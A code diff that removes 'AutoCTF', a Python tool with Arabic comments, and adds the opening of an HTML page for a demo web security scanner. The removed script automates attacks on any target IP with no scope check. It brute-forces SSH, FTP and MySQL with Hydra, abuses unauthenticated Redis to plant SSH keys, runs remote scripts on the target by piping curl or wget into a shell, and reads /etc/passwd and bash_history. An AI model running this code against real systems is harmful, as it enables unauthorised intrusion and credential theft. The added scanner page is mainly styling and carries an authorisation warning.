@@ -1,485 +1,691 @@
-#!/usr/bin/env python3
-# ==========================================
-# AutoCTF - Kali All-Tools Auto Pentesting Tool
-# ==========================================
 
-import os
-import sys
-import time
-import subprocess
-import re
-import json
-import datetime
-import tempfile
-import threading
-from pathlib import Path
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Web Security Scanner</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600&family=Cairo:wght@400;600;700&display=swap');
 
-# ================= الإعدادات =================
-class Colors:
-    HEADER = '\033[95m'
-    BLUE = '\033[94m'
-    CYAN = '\033[96m'
-    GREEN = '\033[92m'
-    WARNING = '\033[93m'
-    FAIL = '\033[91m'
-    BOLD = '\033[1m'
-    ENDC = '\033[0m'
+  :root {
+    --bg: #0a0d14;
+    --bg2: #111520;
+    --bg3: #181d2e;
+    --border: #1e2540;
+    --accent: #00d4ff;
+    --accent2: #0099cc;
+    --red: #ff4444;
+    --orange: #ff8800;
+    --green: #00cc66;
+    --text: #e0e8ff;
+    --text2: #7a8ab0;
+    --mono: 'IBM Plex Mono', monospace;
+    --sans: 'Cairo', sans-serif;
+  }
 
-class AutoCTF:
-    def __init__(self, target):
-        self.target = target
-        self.ports = []
-        self.services = {}
-        self.web_dirs = []
-        self.shell = None
-        self.user_flag = None
-        self.root_flag = None
-        self.log = []
-        self.session_dir = f"session_{target.replace('.', '_')}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
-        os.makedirs(self.session_dir, exist_ok=True)
-        self.log_step(f"بدء جلسة جديدة في {self.session_dir}")
+  * { margin: 0; padding: 0; box-sizing: border-box; }
 
-    # ========== الأساسيات ==========
-    def log_step(self, message):
-        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
-        log_msg = f"[{timestamp}] {message}"
-        self.log.append(log_msg)
-        print(f"{Colors.CYAN}[*] {log_msg}{Colors.ENDC}")
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--sans);
+    min-height: 100vh;
+  }
 
-    def run_command(self, cmd, timeout=120):
-        self.log_step(f"تنفيذ: {cmd}")
-        try:
-            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
-            return result.stdout + result.stderr
-        except subprocess.TimeoutExpired:
-            return "انتهت المهلة"
-        except Exception as e:
-            return f"خطأ: {e}"
+  /* grid bg */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(0,212,255,0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(0,212,255,0.03) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none;
+    z-index: 0;
+  }
 
-    def save_output(self, filename, content):
-        with open(f"{self.session_dir}/{filename}", "w") as f:
-            f.write(content)
+  header {
+    position: relative;
+    z-index: 1;
+    padding: 32px 40px 28px;
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    gap: 16px;
+  }
 
-    # ========== المرحلة 1: الاستطلاع الشامل ==========
-    def recon_all(self):
-        """استخدام أدوات متعددة للاستطلاع"""
-        self.log_step("بدء الاستطلاع الشامل")
-        
-        # 1. Nmap شامل
-        self.log_step("Nmap - فحص جميع المنافذ")
-        nmap_all = self.run_command(f"nmap -p- --min-rate=1000 {self.target}", timeout=300)
-        self.save_output("nmap_all_ports.txt", nmap_all)
-        
-        # استخراج المنافذ المفتوحة
-        open_ports = []
-        for line in nmap_all.splitlines():
-            if "/tcp" in line and "open" in line:
-                port = line.split("/")[0]
-                open_ports.append(port)
-        
-        if open_ports:
-            ports_str = ",".join(open_ports)
-            # 2. Nmap تفصيلي على المنافذ المفتوحة
-            self.log_step("Nmap - فحص تفصيلي للخدمات")
-            nmap_detailed = self.run_command(f"nmap -sC -sV -p{ports_str} {self.target}")
-            self.save_output("nmap_detailed.txt", nmap_detailed)
-            
-            # استخراج الخدمات
-            for line in nmap_detailed.splitlines():
-                m = re.search(r'^(\d+)/tcp\s+open\s+(\S+)', line)
-                if m:
-                    port = m.group(1)
-                    service = m.group(2)
-                    self.ports.append(port)
-                    self.services[port] = service
-        
-        # 3. Masscan سريع (اختياري)
-        if os.path.exists("/usr/bin/masscan"):
-            self.log_step("Masscan - فحص سريع")
-            masscan_out = self.run_command(f"sudo masscan -p1-65535 --rate=1000 {self.target} --output-format grepable -oG {self.session_dir}/masscan.gnmap", timeout=120)
-        
-        # 4. enum4linux لـ SMB
-        if any('netbios' in s or 'microsoft-ds' in s for s in self.services.values()):
-            self.log_step("enum4linux - فحص SMB")
-            enum_out = self.run_command(f"enum4linux -a {self.target}")
-            self.save_output("enum4linux.txt", enum_out)
-        
-        self.log_step(f"الخدمات المكتشفة: {self.services}")
-        return self.services
+  .shield {
+    width: 44px; height: 44px;
+    background: linear-gradient(135deg, var(--accent), var(--accent2));
+    border-radius: 10px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 22px;
+    flex-shrink: 0;
+  }
 
-    # ========== المرحلة 2: تحليل الويب ==========
-    def web_analysis(self, port, protocol="http"):
-        """فحص شامل لخدمات الويب"""
-        url = f"{protocol}://{self.target}:{port}"
-        self.log_step(f"بدء تحليل ويب لـ {url}")
-        
-        # 1. Gobuster / Dirb / Dirsearch
-        wordlist = "/usr/share/wordlists/dirb/common.txt"
-        if os.path.exists("/usr/bin/gobuster"):
-            self.log_step("Gobuster - تعداد الدلائل")
-            gobuster_out = self.run_command(f"gobuster dir -u {url} -w {wordlist} -t 50 -o {self.session_dir}/gobuster_{port}.txt")
-            # استخراج الدلائل
-            dirs = re.findall(r'/(\w+)/?\s+\(Status: 200\)', gobuster_out)
-            self.web_dirs.extend(dirs)
-        
-        # 2. Nikto
-        if os.path.exists("/usr/bin/nikto"):
-            self.log_step("Nikto - فحص الثغرات")
-            nikto_out = self.run_command(f"nikto -h {url} -o {self.session_dir}/nikto_{port}.txt")
-        
-        # 3. WhatWeb
-        if os.path.exists("/usr/bin/whatweb"):
-            self.log_step("WhatWeb - تحديد التقنيات")
-            whatweb_out = self.run_command(f"whatweb {url} > {self.session_dir}/whatweb_{port}.txt")
-        
-        # 4. WPScan إذا كان ووردبريس
-        if "wp-content" in gobuster_out or "wp-admin" in gobuster_out:
-            if os.path.exists("/usr/bin/wpscan"):
-                self.log_step("WPScan - فحص ووردبريس")
-                wpscan_out = self.run_command(f"wpscan --url {url} --enumerate u,vp,vt --api-token YOUR_API_TOKEN > {self.session_dir}/wpscan_{port}.txt")
-        
-        # 5. SQLMap على المعاملات
-        self.log_step("محاولة اكتشاف معاملات SQL")
-        # استخدام waybackurls أو paramspider لجمع URLs
-        if os.path.exists("/usr/bin/waybackurls"):
-            wayback_out = self.run_command(f"waybackurls {self.target} > {self.session_dir}/wayback_urls.txt")
-            if os.path.getsize(f"{self.session_dir}/wayback_urls.txt") > 0:
-                self.log_step("SQLMap - اختبار SQL injection")
-                sqlmap_out = self.run_command(f"sqlmap -m {self.session_dir}/wayback_urls.txt --batch --random-agent --level 2 > {self.session_dir}/sqlmap.txt", timeout=300)
-        
-        # 6. FFUF لاكتشاف المزيد
-        if os.path.exists("/usr/bin/ffuf"):
-            self.log_step("FFUF - fuzzing متقدم")
-            ffuf_out = self.run_command(f"ffuf -u {url}/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ac -o {self.session_dir}/ffuf_{port}.json")
-        
-        self.save_output("web_dirs.txt", "\n".join(self.web_dirs))
-        return self.web_dirs
+  header h1 {
+    font-size: 20px;
+    font-weight: 700;
+    color: var(--text);
+    letter-spacing: 1px;
+  }
 
-    # ========== المرحلة 3: استغلال الخدمات ==========
-    def exploit_services(self):
-        """محاولة استغلال جميع الخدمات المكتشفة"""
-        for port, service in self.services.items():
-            self.log_step(f"محاولة استغلال {service} على المنفذ {port}")
-            
-            # SSH
-            if 'ssh' in service:
-                self.exploit_ssh(port)
-            
-            # FTP
-            elif 'ftp' in service:
-                self.exploit_ftp(port)
-            
-            # SMB
-            elif 'microsoft-ds' in service or 'netbios' in service:
-                self.exploit_smb()
-            
-            # MySQL
-            elif 'mysql' in service:
-                self.exploit_mysql(port)
-            
-            # PostgreSQL
-            elif 'postgresql' in service:
-                self.exploit_postgres(port)
-            
-            # Redis
-            elif 'redis' in service:
-                self.exploit_redis(port)
-            
-            # MongoDB
-            elif 'mongodb' in service:
-                self.exploit_mongodb(port)
-            
-            # Oracle
-            elif 'oracle' in service:
-                self.exploit_oracle(port)
-            
-            # HTTP/HTTPS - تم التعامل معه في web_analysis
-            elif 'http' in service:
-                continue
-            
-            # خدمات أخرى - البحث في searchsploit
-            else:
-                self.search_exploit(service, port)
+  header p {
+    font-size: 13px;
+    color: var(--text2);
+    margin-top: 2px;
+    font-family: var(--mono);
+  }
 
-    def exploit_ssh(self, port):
-        """هجمات SSH"""
-        # 1. هجوم قاموس باستخدام hydra
-        if os.path.exists("/usr/bin/hydra"):
-            self.log_step("Hydra - هجوم قاموس على SSH")
-            wordlist = "/usr/share/wordlists/rockyou.txt"
-            hydra_out = self.run_command(f"hydra -l root -P {wordlist} ssh://{self.target}:{port} -t 4 -o {self.session_dir}/hydra_ssh.txt")
-            
-            # تحليل النتائج
-            if os.path.exists(f"{self.session_dir}/hydra_ssh.txt"):
-                with open(f"{self.session_dir}/hydra_ssh.txt") as f:
-                    data = f.read()
-                    m = re.search(r'login:\s+(\S+)\s+password:\s+(\S+)', data)
-                    if m:
-                        user, pwd = m.groups()
-                        self.log_step(f"وجدنا بيانات SSH: {user}:{pwd}")
-                        # محاولة الاتصال
-                        self.get_shell_via_ssh(user, pwd, port)
-        
-        # 2. البحث عن استغلال
-        self.search_exploit("openssh", port)
+  .tag {
+    margin-right: auto;
+    margin-left: 0;
+    background: rgba(0,212,255,0.08);
+    border: 1px solid rgba(0,212,255,0.2);
+    color: var(--accent);
+    font-size: 11px;
+    font-family: var(--mono);
+    padding: 4px 10px;
+    border-radius: 4px;
+  }
 
-    def exploit_ftp(self, port):
-        """هجمات FTP"""
-        if os.path.exists("/usr/bin/hydra"):
-            self.log_step("Hydra - هجوم قاموس على FTP")
-            hydra_out = self.run_command(f"hydra -l anonymous -P /usr/share/wordlists/rockyou.txt ftp://{self.target}:{port} -t 4 -o {self.session_dir}/hydra_ftp.txt")
-        
-        # محاولة anonymous
-        self.run_command(f"echo 'anonymous\nanonymous\nquit' | ftp {self.target} {port} > {self.session_dir}/ftp_anonymous.txt")
+  main {
+    position: relative;
+    z-index: 1;
+    max-width: 860px;
+    margin: 40px auto;
+    padding: 0 24px;
+  }
 
-    def exploit_smb(self):
-        """هجمات SMB"""
-        if os.path.exists("/usr/bin/smbclient"):
-            self.log_step("SMBclient - محاولة الاتصال")
-            smb_out = self.run_command(f"smbclient -L //{self.target} -N > {self.session_dir}/smb_shares.txt")
-        
-        if os.path.exists("/usr/bin/enum4linux"):
-            enum_out = self.run_command(f"enum4linux -a {self.target} > {self.session_dir}/enum4linux.txt")
-        
-        if os.path.exists("/usr/bin/smbmap"):
-            smbmap_out = self.run_command(f"smbmap -H {self.target} > {self.session_dir}/smbmap.txt")
+  .scan-box {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 14px;
+    padding: 36px;
+    margin-bottom: 28px;
+  }
 
-    def exploit_mysql(self, port):
-        """هجمات MySQL"""
-        # محاولة كلمات مرور افتراضية
-        if os.path.exists("/usr/bin/mysql"):
-            self.log_step("MySQL - محاولة اتصال")
-            mysql_out = self.run_command(f"mysql -h {self.target} -P {port} -u root -p'' -e 'show databases;' > {self.session_dir}/mysql_root_nopass.txt")
-        
-        # هجوم قاموس
-        if os.path.exists("/usr/bin/hydra"):
-            hydra_out = self.run_command(f"hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://{self.target}:{port} -o {self.session_dir}/hydra_mysql.txt")
+  .scan-box label {
+    display: block;
+    font-size: 13px;
+    font-family: var(--mono);
+    color: var(--accent);
+    margin-bottom: 10px;
+    letter-spacing: 1px;
+  }
 
-    def exploit_postgres(self, port):
-        """هجمات PostgreSQL"""
-        if os.path.exists("/usr/bin/psql"):
-            self.log_step("PostgreSQL - محاولة اتصال")
-            pg_out = self.run_command(f"PGPASSWORD='' psql -h {self.target} -p {port} -U postgres -c '\\l' > {self.session_dir}/postgres_nopass.txt")
+  .input-row {
+    display: flex;
+    gap: 10px;
+  }
 
-    def exploit_redis(self, port):
-        """هجمات Redis"""
-        if os.path.exists("/usr/bin/redis-cli"):
-            self.log_step("Redis - محاولة اتصال")
-            redis_out = self.run_command(f"redis-cli -h {self.target} -p {port} info > {self.session_dir}/redis_info.txt")
-            if "redis_version" in redis_out:
-                self.log_step("Redis غير محمي بكلمة مرور")
-                # محاولة كتابة مفتاح SSH
-                self.run_command(f"(echo 'config set dir /root/.ssh'; echo 'config set dbfilename authorized_keys'; echo 'save') | redis-cli -h {self.target} -p {port}")
+  .input-row input {
+    flex: 1;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 13px 16px;
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 14px;
+    direction: ltr;
+    outline: none;
+    transition: border-color 0.2s;
+  }
 
-    def exploit_mongodb(self, port):
-        """هجمات MongoDB"""
-        if os.path.exists("/usr/bin/mongo"):
-            mongo_out = self.run_command(f"echo 'show dbs' | mongo {self.target}:{port} > {self.session_dir}/mongo_dbs.txt")
+  .input-row input:focus { border-color: var(--accent); }
+  .input-row input::placeholder { color: var(--text2); }
 
-    def exploit_oracle(self, port):
-        """هجمات Oracle باستخدام ODAT"""
-        if os.path.exists("/usr/bin/odat"):
-            self.log_step("ODAT - فحص Oracle")
-            odat_out = self.run_command(f"odat all -s {self.target} -p {port} > {self.session_dir}/odat.txt")
+  #scanBtn {
+    background: var(--accent);
+    color: #000;
+    border: none;
+    border-radius: 8px;
+    padding: 13px 28px;
+    font-family: var(--sans);
+    font-size: 14px;
+    font-weight: 700;
+    cursor: pointer;
+    white-space: nowrap;
+    transition: all 0.2s;
+  }
 
-    def search_exploit(self, service, port):
-        """البحث في searchsploit عن استغلال"""
-        if os.path.exists("/usr/bin/searchsploit"):
-            self.log_step(f"Searchsploit - البحث عن {service}")
-            search_out = self.run_command(f"searchsploit {service} > {self.session_dir}/searchsploit_{service}.txt")
-            
-            # إذا وجد استغلال، محاولة استخدام metasploit
-            if os.path.exists("/usr/bin/msfconsole"):
-                self.log_step("Metasploit - محاولة استغلال تلقائي")
-                # يمكن إضافة منطق أكثر تعقيداً هنا
+  #scanBtn:hover { background: #00eeff; transform: translateY(-1px); }
+  #scanBtn:disabled { background: #1e2540; color: var(--text2); cursor: not-allowed; transform: none; }
 
-    # ========== المرحلة 4: الحصول على شيل ==========
-    def get_shell_via_ssh(self, user, password, port):
-        """الاتصال عبر SSH"""
-        self.log_step("محاولة الاتصال عبر SSH")
-        # اختبار الاتصال
-        test_cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -p {port} {user}@{self.target} 'whoami'"
-        output = self.run_command(test_cmd)
-        if user in output:
-            self.log_step("اتصال SSH ناجح")
-            self.shell = f"ssh {user}@{self.target} -p {port}"
-            return True
-        return False
+  .warning {
+    margin-top: 12px;
+    font-size: 12px;
+    color: var(--orange);
+    font-family: var(--mono);
+  }
 
-    # ========== المرحلة 5: رفع الصلاحيات ==========
-    def privesc_all(self):
-        """رفع الصلاحيات باستخدام أدوات متعددة"""
-        if not self.shell:
-            self.log_step("لا يوجد شيل، تخطي رفع الصلاحيات")
-            return
-        
-        self.log_step("بدء رفع الصلاحيات")
-        
-        # 1. unix-privesc-check
-        if os.path.exists("/usr/bin/unix-privesc-check"):
-            self.log_step("Unix-privesc-check - فحص الإعدادات")
-            # رفع الأداة إلى الجهاز الهدف
-            upc_cmd = f"{self.shell} 'wget -q http://{self.get_local_ip()}:8000/unix-privesc-check -O /tmp/upc && chmod +x /tmp/upc && /tmp/upc standard'"
-            # نحتاج لخادم HTTP محلي
-            threading.Thread(target=self.start_http_server).start()
-            time.sleep(2)
-            upc_out = self.run_command(upc_cmd)
-            self.save_output("unix_privesc_check.txt", upc_out)
-        
-        # 2. LinPEAS
-        self.log_step("LinPEAS - فحص متقدم")
-        linpeas_cmd = f"{self.shell} 'curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh'"
-        linpeas_out = self.run_command(linpeas_cmd)
-        self.save_output("linpeas.txt", linpeas_out)
-        
-        # 3. Linux Exploit Suggester
-        self.log_step("Linux Exploit Suggester")
-        les_cmd = f"{self.shell} 'wget -q http://{self.get_local_ip()}:8000/linux-exploit-suggester.sh -O /tmp/les.sh && chmod +x /tmp/les.sh && /tmp/les.sh'"
-        les_out = self.run_command(les_cmd)
-        self.save_output("linux_exploit_suggester.txt", les_out)
-        
-        # 4. جمع معلومات النظام
-        info_commands = [
-            "sudo -l",
-            "find / -perm -4000 -type f 2>/dev/null",
-            "cat /etc/crontab",
-            "cat /etc/passwd",
-            "uname -a",
-            "cat /etc/*-release",
-            "ps aux",
-            "netstat -tulpn",
-            "cat ~/.bash_history",
-            "ls -la /home/*/.*",
-            "find / -name '*flag*' 2>/dev/null"
-        ]
-        for cmd in info_commands:
-            out = self.run_command(f"{self.shell} '{cmd}'")
-            self.save_output(f"info_{cmd.replace(' ', '_')}.txt", out)
-    
-    def get_local_ip(self):
-        """الحصول على IP المحلي لخادم HTTP"""
-        try:
-            ip = self.run_command("ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'").strip()
-            if not ip:
-                ip = self.run_command("hostname -I | awk '{print $1}'").strip()
-            return ip
-        except:
-            return "127.0.0.1"
-    
-    def start_http_server(self):
-        """تشغيل خادم HTTP لمشاركة الأدوات"""
-        os.chdir(self.session_dir)
-        self.run_command("python3 -m http.server 8000 > /dev/null 2>&1")
+  /* Loading */
+  #loadingBox {
+    display: none;
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 14px;
+    padding: 36px;
+    margin-bottom: 28px;
+    text-align: center;
+  }
 
-    # ========== المرحلة 6: البحث عن العلم ==========
-    def search_all_flags(self):
-        """البحث الشامل عن user.flag و root.flag"""
-        self.log_step("بدء البحث عن الأعلام")
-        
-        if self.shell:
-            # أوامر بحث متعددة
-            search_commands = [
-                "find / -name 'user.flag' -type f -exec cat {} \\; 2>/dev/null",
-                "find / -name 'root.flag' -type f -exec cat {} \\; 2>/dev/null",
-                "find / -name '*flag*' -type f -exec cat {} \\; 2>/dev/null | head -5",
-                "cat /root/root.flag 2>/dev/null",
-                "cat /root/root.txt 2>/dev/null",
-                "cat /home/*/user.flag 2>/dev/null",
-                "cat /home/*/user.txt 2>/dev/null",
-                "cat /var/www/html/flag.txt 2>/dev/null",
-                "cat /tmp/flag.txt 2>/dev/null"
-            ]
-            
-            for cmd in search_commands:
-                out = self.run_command(f"{self.shell} '{cmd}'")
-                if out and len(out.strip()) > 0 and "No such file" not in out:
-                    if "user.flag" in cmd or "user.txt" in cmd:
-                        self.user_flag = out.strip()
-                        self.log_step(f"وجدنا user.flag: {self.user_flag}")
-                    elif "root.flag" in cmd or "root.txt" in cmd:
-                        self.root_flag = out.strip()
-                        self.log_step(f"وجدنا root.flag: {self.root_flag}")
-                    else:
-                        self.log_step(f"وجدنا ملف علم محتمل: {out[:100]}")
-        else:
-            self.log_step("لا يوجد شيل، تخطي البحث عن الأعلام")
+  .spinner-wrap {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 12px;
+    margin-bottom: 24px;
+  }
 
-    # ========== التشغيل الرئيسي ==========
-    def run(self):
-        """تشغيل جميع المراحل بالتسلسل"""
-        self.log_step(f"بدء الهجوم التلقائي على {self.target}")
-        
-        # المرحلة 1: الاستطلاع
-        self.recon_all()
-        
-        # المرحلة 2: تحليل الويب
-        for port, service in self.services.items():
-            if 'http' in service or 'https' in service:
-                protocol = 'https' if 'https' in service else 'http'
-                self.web_analysis(port, protocol)
-        
-        # المرحلة 3: استغلال الخدمات
-        self.exploit_services()
-        
-        # إذا لم نحصل على شيل من الخدمات، حاول هجمات إضافية
-        if not self.shell:
-            self.log_step("محاولة هجمات إضافية...")
-            # يمكن إضافة المزيد هنا
-        
-        # المرحلة 4: رفع الصلاحيات والبحث عن العلم
-        if self.shell:
-            self.privesc_all()
-            self.search_all_flags()
-        
-        # عرض النتائج النهائية
-        self.show_results()
-    
-    def show_results(self):
-        """عرض النتائج النهائية"""
-        print(f"\n{Colors.GREEN}{Colors.BOLD}{'='*60}{Colors.ENDC}")
-        print(f"{Colors.GREEN}{Colors.BOLD}=== النتائج النهائية ==={Colors.ENDC}")
-        print(f"{Colors.GREEN}{Colors.BOLD}{'='*60}{Colors.ENDC}")
-        
-        print(f"{Colors.BOLD}الهدف:{Colors.ENDC} {self.target}")
-        print(f"{Colors.BOLD}المنافذ المفتوحة:{Colors.ENDC} {', '.join(self.ports) if self.ports else 'لا شيء'}")
-        print(f"{Colors.BOLD}الخدمات:{Colors.ENDC}")
-        for port, service in self.services.items():
-            print(f"  - {port}: {service}")
-        
-        print(f"\n{Colors.BOLD}الدلائل المكتشفة:{Colors.ENDC}")
-        for d in self.web_dirs[:10]:
-            print(f"  - {d}")
-        
-        print(f"\n{Colors.BOLD}الأعلام:{Colors.ENDC}")
-        if self.user_flag:
-            print(f"  {Colors.GREEN}user.flag: {self.user_flag}{Colors.ENDC}")
-        else:
-            print(f"  {Colors.FAIL}user.flag: غير موجود{Colors.ENDC}")
-        
-        if self.root_flag:
-            print(f"  {Colors.GREEN}root.flag: {self.root_flag}{Colors.ENDC}")
-        else:
-            print(f"  {Colors.FAIL}root.flag: غير موجود{Colors.ENDC}")
-        
-        print(f"\n{Colors.CYAN}تم حفظ جميع المخرجات في: {self.session_dir}{Colors.ENDC}")
+  .spinner {
+    width: 24px; height: 24px;
+    border: 2px solid var(--border);
+    border-top: 2px solid var(--accent);
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+  }
 
-# ========== نقطة الدخول ==========
-if __name__ == "__main__":
-    # التحقق من وجود الأدوات الأساسية
-    required_tools = ['nmap', 'gobuster', 'hydra', 'searchsploit']
-    missing = []
-    for tool in required_tools:
-        if not os.path.exists(f"/usr/bin/{tool}") and not os.path.exists(f"/usr/sbin/{tool}"):
-            missing.append(tool)
-    
-    if missing:
-        print(f"{Colors.WARNING}تحذير: بعض الأدوات غير موجودة: {', '.join(missing)}{Colors.ENDC}")
-        print("قد لا تعمل بعض الوظائف بشكل كامل.")
-    
-    if len(sys.argv) < 2:
-        print(f"استخدام: {sys.argv[0]} <target_ip>")
-        sys.exit(1)
-    
-    target = sys.argv[1]
-    agent = AutoCTF(target)
-    agent.run()
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  .scanning-text {
+    font-family: var(--mono);
+    font-size: 14px;
+    color: var(--accent);
+  }
+
+  .steps-grid {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 8px;
+    justify-content: center;
+  }
+
+  .step {
+    font-family: var(--mono);
+    font-size: 12px;
+    padding: 5px 14px;
+    border-radius: 4px;
+    border: 1px solid var(--border);
+    color: var(--text2);
+    transition: all 0.3s;
+  }
+
+  .step.active { border-color: var(--accent); color: var(--accent); background: rgba(0,212,255,0.07); }
+  .step.done { border-color: var(--green); color: var(--green); background: rgba(0,204,102,0.07); }
+
+  /* Summary cards */
+  .cards-row {
+    display: grid;
+    grid-template-columns: repeat(4, minmax(0,1fr));
+    gap: 12px;
+    margin-bottom: 24px;
+  }
+
+  @media(max-width:580px) { .cards-row { grid-template-columns: repeat(2,1fr); } }
+
+  .card {
+    border-radius: 12px;
+    padding: 20px 16px;
+    text-align: center;
+    border: 1px solid transparent;
+  }
+
+  .card-num { font-size: 32px; font-weight: 700; font-family: var(--mono); }
+  .card-lbl { font-size: 12px; margin-top: 4px; font-family: var(--mono); }
+
+  .card-total  { background: rgba(0,212,255,0.08); border-color: rgba(0,212,255,0.2); }
+  .card-total  .card-num { color: var(--accent); }
+  .card-total  .card-lbl { color: var(--accent2); }
+
+  .card-high   { background: rgba(255,68,68,0.08); border-color: rgba(255,68,68,0.2); }
+  .card-high   .card-num { color: var(--red); }
+  .card-high   .card-lbl { color: #cc3333; }
+
+  .card-medium { background: rgba(255,136,0,0.08); border-color: rgba(255,136,0,0.2); }
+  .card-medium .card-num { color: var(--orange); }
+  .card-medium .card-lbl { color: #cc7700; }
+
+  .card-low    { background: rgba(0,204,102,0.08); border-color: rgba(0,204,102,0.2); }
+  .card-low    .card-num { color: var(--green); }
+  .card-low    .card-lbl { color: #009944; }
+
+  /* Sections */
+  .section {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 24px;
+    margin-bottom: 20px;
+  }
+
+  .section-title {
+    font-size: 13px;
+    font-family: var(--mono);
+    color: var(--accent);
+    letter-spacing: 1px;
+    margin-bottom: 16px;
+    padding-bottom: 12px;
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  /* Info items */
+  .info-item {
+    display: flex;
+    gap: 12px;
+    padding: 9px 12px;
+    background: var(--bg);
+    border-radius: 6px;
+    margin-bottom: 6px;
+    border: 1px solid var(--border);
+  }
+
+  .info-key {
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--accent2);
+    min-width: 140px;
+  }
+
+  .info-val {
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--text);
+    direction: ltr;
+    word-break: break-all;
+  }
+
+  /* Vuln cards */
+  .vuln-card {
+    border-radius: 10px;
+    overflow: hidden;
+    margin-bottom: 12px;
+    border: 1px solid var(--border);
+  }
+
+  .vuln-head {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 12px 16px;
+  }
+
+  .vuln-head-title {
+    font-family: var(--mono);
+    font-size: 13px;
+    font-weight: 600;
+  }
+
+  .badge {
+    font-family: var(--mono);
+    font-size: 11px;
+    padding: 3px 10px;
+    border-radius: 4px;
+  }
+
+  .vuln-high .vuln-head { background: rgba(255,68,68,0.12); border-bottom: 1px solid rgba(255,68,68,0.2); }
+  .vuln-high .vuln-head-title { color: var(--red); }
+  .vuln-high .badge { background: rgba(255,68,68,0.15); color: var(--red); }
+
+  .vuln-medium .vuln-head { background: rgba(255,136,0,0.12); border-bottom: 1px solid rgba(255,136,0,0.2); }
+  .vuln-medium .vuln-head-title { color: var(--orange); }
+  .vuln-medium .badge { background: rgba(255,136,0,0.15); color: var(--orange); }
+
+  .vuln-low .vuln-head { background: rgba(0,204,102,0.12); border-bottom: 1px solid rgba(0,204,102,0.2); }
+  .vuln-low .vuln-head-title { color: var(--green); }
+  .vuln-low .badge { background: rgba(0,204,102,0.15); color: var(--green); }
+
+  .vuln-body {
+    padding: 14px 16px;
+    background: var(--bg);
+  }
+
+  .vuln-row {
+    display: flex;
+    gap: 10px;
+    margin-bottom: 8px;
+    font-size: 13px;
+  }
+
+  .vuln-row:last-child { margin-bottom: 0; }
+
+  .vuln-lbl {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text2);
+    min-width: 80px;
+    padding-top: 2px;
+  }
+
+  .vuln-val { color: var(--text); line-height: 1.6; }
+
+  /* Download btn */
+  .dl-wrap { text-align: center; padding: 10px 0 20px; }
+
+  .dl-btn {
+    background: transparent;
+    border: 1px solid var(--green);
+    color: var(--green);
+    padding: 12px 36px;
+    border-radius: 8px;
+    font-family: var(--sans);
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.2s;
+    font-family: var(--mono);
+  }
+
+  .dl-btn:hover { background: rgba(0,204,102,0.1); transform: translateY(-1px); }
+
+  /* Error */
+  .error-box {
+    display: none;
+    background: rgba(255,68,68,0.08);
+    border: 1px solid rgba(255,68,68,0.3);
+    border-radius: 10px;
+    padding: 16px 20px;
+    margin-bottom: 20px;
+    font-family: var(--mono);
+    font-size: 13px;
+    color: var(--red);
+  }
+
+  .no-vulns {
+    text-align: center;
+    padding: 24px;
+    color: var(--green);
+    font-family: var(--mono);
+    font-size: 14px;
+  }
+
+  footer {
+    position: relative;
+    z-index: 1;
+    text-align: center;
+    padding: 24px;
+    color: var(--text2);
+    font-family: var(--mono);
+    font-size: 11px;
+    border-top: 1px solid var(--border);
+    margin-top: 20px;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="shield">🛡️</div>
+  <div>
+    <h1>WEB SECURITY SCANNER</h1>
+    <p>Vulnerability Detection & Reporting System</p>
+  </div>
+  <div class="tag">v1.0 — DEMO</div>
+</header>
+
+<main>
+
+  <div class="scan-box">
+    <label>// TARGET URL</label>
+    <div class="input-row">
+      <input type="text" id="urlInput" placeholder="https://example.com" autocomplete="off" />
+      <button id="scanBtn" onclick="startScan()">▶ ابدأ الفحص</button>
+    </div>
+    <div class="warning">⚠ استخدم هذه الأداة فقط على مواقع تملكها أو لديك إذن صريح بفحصها</div>
+  </div>
+
+  <div id="loadingBox">
+    <div class="spinner-wrap">
+      <div class="spinner"></div>
+      <span class="scanning-text" id="scanningLabel">SCANNING...</span>
+    </div>
+    <div class="steps-grid">
+      <span class="step" id="s1">SSL/TLS</span>
+      <span class="step" id="s2">SEC HEADERS</span>
+      <span class="step" id="s3">SQL INJECTION</span>
+      <span class="step" id="s4">XSS</span>
+      <span class="step" id="s5">SENSITIVE FILES</span>
+      <span class="step" id="s6">DNS</span>
+    </div>
+  </div>
+
+  <div class="error-box" id="errorBox"></div>
+
+  <div id="resultsBox" style="display:none;">
+    <div class="cards-row">
+      <div class="card card-total"><div class="card-num" id="cTotal">0</div><div class="card-lbl">TOTAL</div></div>
